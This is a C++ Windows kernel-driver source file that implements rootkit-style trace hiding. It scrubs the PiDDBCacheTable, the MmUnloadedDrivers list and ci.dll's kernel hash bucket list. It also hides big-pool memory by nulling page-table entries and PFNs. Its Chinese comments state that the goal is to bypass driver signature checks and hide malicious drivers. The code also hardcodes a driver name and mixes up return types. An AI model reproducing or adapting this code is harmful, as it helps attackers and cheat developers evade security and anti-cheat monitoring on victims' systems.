#include "hide.h"
#include "Util.h"
#include "Memory.h"

#define MM_UNLOADED_DRIVERS_SIZE 50

typedef struct _PIDDBCACHE_ENTRY {
	LIST_ENTRY		List;
	UNICODE_STRING	DriverName;
	ULONG			TimeDateStamp;
	NTSTATUS		LoadStatus;
	char			_0x0028[16];
} PIDDBCACHE_ENTRY, * PPIDDBCACHE_ENTRY;

typedef struct _MM_UNLOADED_DRIVER {
	UNICODE_STRING 	Name;
	PVOID 			ModuleStart;
	PVOID 			ModuleEnd;
	ULONG64 		UnloadTime;
} MM_UNLOADED_DRIVER, * PMM_UNLOADED_DRIVER;

PERESOURCE
GetPsLoaded() {
	auto n = "ntoskrnl.exe";
	NtosBaseInfo BaseInfo;
	PCHAR base = (PCHAR)Util::GetDriverBase(n, &BaseInfo);

	auto cMmGetSystemRoutineAddress = reinterpret_cast<decltype(&MmGetSystemRoutineAddress)>(Util::GetExportedFunction((ULONGLONG)BaseInfo.BaseAddress, "MmGetSystemRoutineAddress"));

	ERESOURCE PsLoadedModuleResource;
	UNICODE_STRING routineName = RTL_CONSTANT_STRING(L"PsLoadedModuleResource");
	auto cPsLoadedModuleResource = reinterpret_cast<decltype(&PsLoadedModuleResource)>(cMmGetSystemRoutineAddress(&routineName));

	return cPsLoadedModuleResource;
}

PMM_UNLOADED_DRIVER
GetMmuAddress() {
	auto n = "ntoskrnl.exe";
	NtosBaseInfo BaseInfo;
	PCHAR base = (PCHAR)Util::GetDriverBase(n, &BaseInfo);


	PVOID MmUnloadedDriversInstr = Util::FindPatternImage((PCHAR)BaseInfo.BaseAddress, MMU_PATTERN, MMU_MASK);


	if (MmUnloadedDriversInstr == NULL)
		return { };

	return *(PMM_UNLOADED_DRIVER*)Memory::ResolveRelativeAddress(MmUnloadedDriversInstr, 3, 7);
}

PULONG
GetMmlAddress() {
	auto n = "ntoskrnl.exe";
	NtosBaseInfo BaseInfo;
	PCHAR base = (PCHAR)Util::GetDriverBase(n, &BaseInfo);

	PVOID mmlastunloadeddriverinst = Util::FindPatternImage((PCHAR)BaseInfo.BaseAddress, MML_PATTERN, MML_MASK);


	if (mmlastunloadeddriverinst == NULL)
		return { };

	return (PULONG)Memory::ResolveRelativeAddress(mmlastunloadeddriverinst, 2, 6);
}

BOOL
VerifyMmu() {
	return (GetMmuAddress() != NULL && GetMmlAddress() != NULL);
}

BOOL
IsUnloadEmpty(
	PMM_UNLOADED_DRIVER Entry
) {
	if (Entry->Name.MaximumLength == 0 || Entry->Name.Length == 0 || Entry->Name.Buffer == NULL)
		return TRUE;

	return FALSE;
}

BOOL
IsMmuFilled() {
	for (ULONG Idx = 0; Idx < MM_UNLOADED_DRIVERS_SIZE; ++Idx) {
		PMM_UNLOADED_DRIVER Entry = &GetMmuAddress()[Idx];
		if (IsUnloadEmpty(Entry))
			return FALSE;
	}
	return TRUE;
}

//BOOL
//CleanMmu(
//	UNICODE_STRING DriverName
//) {
//	auto ps_loaded = GetPsLoaded();
//	// 检查 ps_loaded 是否有效
//	if (ps_loaded == NULL) {
//		DbgPrintEx(77, 0, "Failed to get PsLoaded resource\n");
//		return FALSE;
//	}
//
//	ExAcquireResourceExclusiveLite(ps_loaded, TRUE);
//
//
//	BOOLEAN Modified = FALSE;
//	BOOLEAN Filled = IsMmuFilled();
//
//	for (ULONG Index = 0; Index < MM_UNLOADED_DRIVERS_SIZE; ++Index) {
//		PMM_UNLOADED_DRIVER Entry = &GetMmuAddress()[Index];
//		if (IsUnloadEmpty(Entry)) {
//			continue;
//		}
//		BOOL empty = IsUnloadEmpty(Entry);
//		if (Modified) {
//			PMM_UNLOADED_DRIVER PrevEntry = &GetMmuAddress()[Index - 1];
//			RtlCopyMemory(PrevEntry, Entry, sizeof(MM_UNLOADED_DRIVER));
//
//			if (Index == MM_UNLOADED_DRIVERS_SIZE - 1) {
//				RtlFillMemory(Entry, sizeof(MM_UNLOADED_DRIVER), 0);
//			}
//		}
//		else if (RtlEqualUnicodeString(&DriverName, &Entry->Name, TRUE)) {
//			PVOID BufferPool = Entry->Name.Buffer;
//			RtlFillMemory(Entry, sizeof(MM_UNLOADED_DRIVER), 0);
//			ExFreePoolWithTag(BufferPool, 'TDmM');
//
//			*GetMmlAddress() = (Filled ? MM_UNLOADED_DRIVERS_SIZE : *GetMmlAddress()) - 1;
//			Modified = TRUE;
//		}
//	}
//
//	if (Modified) {
//		ULONG64 PreviousTime = 0;
//
//		for (LONG Index = MM_UNLOADED_DRIVERS_SIZE - 2; Index >= 0; --Index) {
//			PMM_UNLOADED_DRIVER Entry = &GetMmuAddress()[Index];
//			if (IsUnloadEmpty(Entry)) {
//				continue;
//			}
//
//			if (PreviousTime != 0 && Entry->UnloadTime > PreviousTime) {
//				Entry->UnloadTime = PreviousTime - Util::RandomNum();
//			}
//
//			PreviousTime = Entry->UnloadTime;
//		}
//
//		CleanMmu(DriverName);
//	}
//
//	ExReleaseResourceLite(ps_loaded);
//
//	return Modified;
//}
BOOL CleanMmu(
	UNICODE_STRING DriverName
) {
	// 获取 PsLoaded 资源
	auto ps_loaded = GetPsLoaded();

	// 检查 ps_loaded 是否有效
	if (ps_loaded == NULL) {
		DbgPrintEx(77, 0, "Failed to get PsLoaded resource\n");
		return FALSE;
	}

	// 尝试获取 PsLoaded 的独占锁
	ExAcquireResourceExclusiveLite(ps_loaded, TRUE);
	DbgPrintEx(77, 0, "Resource acquired exclusive lock\n");

	BOOLEAN Modified = FALSE;
	BOOLEAN Filled = IsMmuFilled();

	// 遍历 MM_UNLOADED_DRIVERS_SIZE 中的每个条目
	for (ULONG Index = 0; Index < MM_UNLOADED_DRIVERS_SIZE; ++Index) {
		PMM_UNLOADED_DRIVER Entry = &GetMmuAddress()[Index];

		// 如果该条目为空，跳过
		if (IsUnloadEmpty(Entry)) {
			DbgPrintEx(77, 0, "Entry %d is empty, skipping\n", Index);
			continue;
		}

		// 打印当前条目的名称
		DbgPrintEx(77, 0, "Entry %d driver name: %wZ\n", Index, &Entry->Name);

		// 检查该条目是否为目标驱动
		if (RtlEqualUnicodeString(&DriverName, &Entry->Name, false)) {
			DbgPrintEx(77, 0, "Found matching driver: %wZ\n", &Entry->Name);

			// 释放该条目的内存
			PVOID BufferPool = Entry->Name.Buffer;
			RtlFillMemory(Entry, sizeof(MM_UNLOADED_DRIVER), 0);
			ExFreePoolWithTag(BufferPool, 'TDmM');

			// 更新 MM_UNLOADED_DRIVERS_SIZE 的索引
			*GetMmlAddress() = (Filled ? MM_UNLOADED_DRIVERS_SIZE : *GetMmlAddress()) - 1;
			Modified = TRUE;

			// 打印修改后的状态
			DbgPrintEx(77, 0, "Driver %wZ has been removed\n", &DriverName);
		}
	}

	// 如果进行了修改，更新卸载时间
	if (Modified) {
		ULONG64 PreviousTime = 0;

		// 逆向遍历并修改卸载时间
		for (LONG Index = MM_UNLOADED_DRIVERS_SIZE - 2; Index >= 0; --Index) {
			PMM_UNLOADED_DRIVER Entry = &GetMmuAddress()[Index];

			// 如果该条目为空，跳过
			if (IsUnloadEmpty(Entry)) {
				DbgPrintEx(77, 0, "Entry %d is empty, skipping\n", Index);
				continue;
			}

			// 打印卸载时间
			DbgPrintEx(77, 0, "Entry %d unload time: %llu\n", Index, Entry->UnloadTime);

			// 如果找到有效的 PreviousTime，更新当前条目的卸载时间
			if (PreviousTime != 0 && Entry->UnloadTime > PreviousTime) {
				Entry->UnloadTime = PreviousTime - Util::RandomNum();
			}

			PreviousTime = Entry->UnloadTime;
		}

		// 递归调用 CleanMmu 进行后续清理
		CleanMmu(DriverName);
	}

	// 释放 PsLoaded 锁
	ExReleaseResourceLite(ps_loaded);
	DbgPrintEx(77, 0, "Resource released\n");

	return Modified;
}


PERESOURCE
GetPiDDBLock() {
	// 加密字符串 "ntoskrnl.exe"，用于获取内核模块基地址
	auto n = "ntoskrnl.exe";
	NtosBaseInfo BaseInfo;
	// 调用 Util::GetDriverBase 获取 ntoskrnl.exe 驱动的基地址
	PCHAR base = (PCHAR)Util::GetDriverBase(n, &BaseInfo);
	// 加密 PIDDB_LOCK_PATTERN 和 PIDDB_LOCK_MASK 字符串


	// 使用模式扫描 (Pattern Scanning) 查找 PiDDBLock 的地址
	// PiDDBLockPattern 和 PiDDBLockMask 是加密字符串，经过解密后进行模式匹配
	PERESOURCE PiDDBLock = (PERESOURCE)Util::FindPatternImage((PCHAR)BaseInfo.BaseAddress, PIDDB_LOCK_PATTERN, PIDDB_LOCK_MASK);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PiDDBLock address: %p\n", PiDDBLock);
	

	// 如果找到了 PiDDBLock，解析相对地址
	// `Memory::ResolveRelativeAddress` 通过偏移量解析 PiDDBLock 的最终地址
	PiDDBLock = (PERESOURCE)Memory::ResolveRelativeAddress((PVOID)PiDDBLock, 3, 7);
	if (!PiDDBLock) {
		return 0;
	}
	
	return PiDDBLock;
}

PRTL_AVL_TABLE
GetPiDDBTable() {
	auto n = "ntoskrnl.exe";
	NtosBaseInfo BaseInfo;
	PCHAR base = (PCHAR)Util::GetDriverBase(n, &BaseInfo);


	PVOID PiDDBCacheTablePtr = Util::FindPatternImage((PCHAR)BaseInfo.BaseAddress, PIDDB_TABLE_PATTERN, PIDDB_TABLE_MASK);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PiDDBCacheTablePtr address: %p\n", PiDDBCacheTablePtr);

	//PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)Memory::ResolveRelativeAddress(PiDDBCacheTablePtr, 3, 7); // 6 10
	PRTL_AVL_TABLE PiDDBCacheTable = (PRTL_AVL_TABLE)Memory::ResolveRelativeAddress(PiDDBCacheTablePtr, 6, 10); // 6 10

	if (!PiDDBCacheTable) {
		return 0;
	}

	return PiDDBCacheTable;
}

BOOL
VerifyPiDDB() {
	return (GetPiDDBLock() != 0 && GetPiDDBTable() != 0);
}

BOOL
CleanPiDDB(
	UNICODE_STRING DriverName
) {
	PERESOURCE PiDDBLock = GetPiDDBLock();
	PRTL_AVL_TABLE PiDDBCacheTable = GetPiDDBTable();



	PiDDBCacheTable->TableContext = (PVOID)1;
	PIDDBCACHE_ENTRY LookupEntry = { 0 };
	RtlInitUnicodeString(&LookupEntry.DriverName, L"MyDriver1.sys");
	LookupEntry.TimeDateStamp = 900;
	//LookupEntry.DriverName.Length= (USHORT)(22* 2);
	//LookupEntry.DriverName.MaximumLength = LookupEntry.DriverName.Length + 2;

	ExAcquireResourceExclusiveLite(PiDDBLock, TRUE);
	PIDDBCACHE_ENTRY* pFoundEntry = (PIDDBCACHE_ENTRY*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, &LookupEntry);
	if (pFoundEntry == NULL) {
		ExReleaseResourceLite(PiDDBLock);
		return FALSE;
	}
	RemoveEntryList(&pFoundEntry->List);
	RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry);
	ExReleaseResourceLite(PiDDBLock);
	return TRUE;
}

BOOL
CleanKernelHashBucketList(
	UNICODE_STRING DriverName
) {
	auto CIDLLString = "ci.dll";
	NtosBaseInfo BaseInfo;
	CONST PVOID CIDLLBase = Util::GetDriverBase(CIDLLString, &BaseInfo);


	if (!CIDLLBase) {
		return FALSE;
	}


	CONST PVOID SignatureAddress = Util::FindPatternImage((PCHAR)BaseInfo.BaseAddress, CI_DLL_KERNEL_HASH_BUCKET_PATTERN, CI_DLL_KERNEL_HASH_BUCKET_MASK);
	if (!SignatureAddress) {
		return FALSE;
	}

	CONST ULONGLONG* g_KernelHashBucketList = (ULONGLONG*)Memory::ResolveRelativeAddress(SignatureAddress, 3, 7);
	if (!g_KernelHashBucketList) {
		return FALSE;
	}

	LARGE_INTEGER Time{};
	KeQuerySystemTimePrecise(&Time);

	BOOL Status = FALSE;
	for (ULONGLONG i = *g_KernelHashBucketList; i; i = *(ULONGLONG*)i) {
		CONST PWCHAR wsName = PWCH(i + 0x48);
		if (wcsstr(wsName, DriverName.Buffer)) {
			PUCHAR Hash = PUCHAR(i + 0x18);
			for (UINT j = 0; j < 20; j++)
				Hash[j] = UCHAR(RtlRandomEx(&Time.LowPart) % 255);

			Status = TRUE;
		}
	}

	return Status;
}

BOOL
DeleteRegistryKey(
	UNICODE_STRING RegistryPath
) {
	HANDLE KeyHandle;
	OBJECT_ATTRIBUTES KeyAttributes;

	InitializeObjectAttributes(&KeyAttributes, &RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS(ZwOpenKey(&KeyHandle, KEY_ALL_ACCESS, &KeyAttributes))) {
		return FALSE;
	}

	if (!NT_SUCCESS(ZwDeleteKey(KeyHandle))) {
		return FALSE;
	}

	return TRUE;
}

BOOL
DeleteFile(
	UNICODE_STRING FilePath
) {
	OBJECT_ATTRIBUTES FileAttributes;
	InitializeObjectAttributes(&FileAttributes, &FilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

	if (!NT_SUCCESS(ZwDeleteFile(&FileAttributes))) {
		return FALSE;
	}

	return TRUE;
}





NTSTATUS Hide::HideEverything(UNICODE_STRING DriverName) {
	NTSTATUS Status = STATUS_SUCCESS;
	//包含了已加载驱动程序的签名和哈希值等信息。通过清除这个表，可以清除对已加载驱动程序的签名验证记录，从而绕过驱动程序签名的检查。
	if (VerifyPiDDB()) {
		if (!CleanPiDDB(DriverName)) {
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Failed to clean PiDDB\n");
			Status = STATUS_UNSUCCESSFUL;
		}
	}
	else {
		DbgPrintEx(77,0,"Failed to verify piddb\n");
		Status = STATUS_UNSUCCESSFUL;
	}
	
	//MmUnloadedDrivers 是一个内核数据结构，保存了已卸载驱动程序的信息。通过清除它，可以隐藏卸载的驱动程序，防止它们在内核中被追踪或恢复。
	if (VerifyMmu()) {
		if (!CleanMmu(DriverName)) {
			DbgPrintEx(77,0,"Failed to clean mmu\n");
			Status = STATUS_UNSUCCESSFUL;
		}
	}
	else {
		DbgPrintEx(77,0,"Failed to verify mmu\n");
		Status = STATUS_UNSUCCESSFUL;
	}
	
	//g_KernelHashBucketList 是一个内核哈希表，包含了对已加载模块的哈希值索引。清除这个哈希表可以删除已加载模块的痕迹，进一步隐藏恶意驱动或内核模块。
	if (CleanKernelHashBucketList(DriverName)) {
	}
	else {
		DbgPrintEx(77,0,"failed to clean has bucket list\n");
		Status = STATUS_UNSUCCESSFUL;
	}
	
	return Status;
}

BOOLEAN Hide::FindPoolTable(uintptr_t* PoolBigPageTable, SIZE_T* PoolBigPageTableSize, PVOID ModuleBase) {
	PCHAR Pattern1 = (PCHAR)"\xE8\x00\x00\x00\x00\x83\x67\x0C\x00";
	PCHAR Mask1 = (PCHAR)"x????xxxx";

	PVOID ExProtectPoolExCallInstructionAdd = (PVOID)Util::FindPatternImage((PCHAR)ModuleBase, Pattern1, Mask1);


	if (!ExProtectPoolExCallInstructionAdd) 
		return FALSE;

	PVOID ExProtectPoolAddress = Memory::ResolveRelativeAddress(ExProtectPoolExCallInstructionAdd, 1, 5);

	if (!ExProtectPoolAddress) 
		return FALSE;

	PVOID PoolBigPageTableInstructionAddress = (PVOID)((ULONG64)ExProtectPoolAddress + 0x95);
	*PoolBigPageTable = (uintptr_t)Memory::ResolveRelativeAddress(PoolBigPageTableInstructionAddress, 3, 7);


	PVOID PoolBigPageTableSizeInstructionAddress = (PVOID)((ULONG64)ExProtectPoolAddress + 0x8E);
	*PoolBigPageTableSize = (SIZE_T)Memory::ResolveRelativeAddress(PoolBigPageTableSizeInstructionAddress, 3, 7);


	return TRUE;
}

BOOLEAN Hide::NullPfn(PMDL mdl) {
	PPFN_NUMBER mdlPages = MmGetMdlPfnArray(mdl);
	if (!mdlPages) 
		return FALSE;

	ULONG MdlPageCount = ADDRESS_AND_SIZE_TO_SPAN_PAGES(MmGetMdlVirtualAddress(mdl), MmGetMdlByteCount(mdl));

	ULONG NullPfn = 0x0;

	MM_COPY_ADDRESS SrcAddress{ 0 };
	SrcAddress.VirtualAddress = &NullPfn;

	for (ULONG i = 0; i < MdlPageCount; i++) {
		size_t Bytes = 0;
		MmCopyMemory(&mdlPages[i], SrcAddress, sizeof(ULONG), MM_COPY_MEMORY_VIRTUAL, &Bytes);

	}


	return TRUE;
}

NTSTATUS Hide::Hide(PVOID BigPoolAddress) {
	NTSTATUS Status = STATUS_SUCCESS;


	NtosBaseInfo NtosInfo{ 0 };
	auto sDriverName = "ntoskrnl.exe";
	Util::GetDriverBase(sDriverName, &NtosInfo);
	if (!NtosInfo.BaseAddress) 
		return STATUS_UNSUCCESSFUL;

	uintptr_t pPoolBigPageTable = 0;
	SIZE_T pPoolBigPageTableSize = 0;
	ULONGLONG NumOfBytes = 0;

	if (FindPoolTable(&pPoolBigPageTable, &pPoolBigPageTableSize, NtosInfo.BaseAddress)) {

		PPOOL_TRACKER_BIG_PAGES PoolBigPageTable{ 0 };
		RtlCopyMemory(&PoolBigPageTable, (PVOID)pPoolBigPageTable, 8);
		SIZE_T PoolBigPageTableSize = 0;
		RtlCopyMemory(&PoolBigPageTableSize, (PVOID)pPoolBigPageTableSize, 8);

		for (int i = 0; i < PoolBigPageTableSize; i++) {
			if (PoolBigPageTable[i].Va == (ULONGLONG)BigPoolAddress || PoolBigPageTable[i].Va == ((ULONGLONG)BigPoolAddress + 0x1)) {
				NumOfBytes = PoolBigPageTable[i].NumberOfBytes;
				PoolBigPageTable[i].Va = 0x1;
				PoolBigPageTable[i].NumberOfBytes = 0x0;
			}
		}
	}

	
	auto MDL = IoAllocateMdl(reinterpret_cast<PVOID>(BigPoolAddress), NumOfBytes, FALSE, FALSE, NULL);


	if (!NullPfn(MDL)) {
		return FALSE;
	}
	else {
		return TRUE;
	}
	


	return TRUE;
}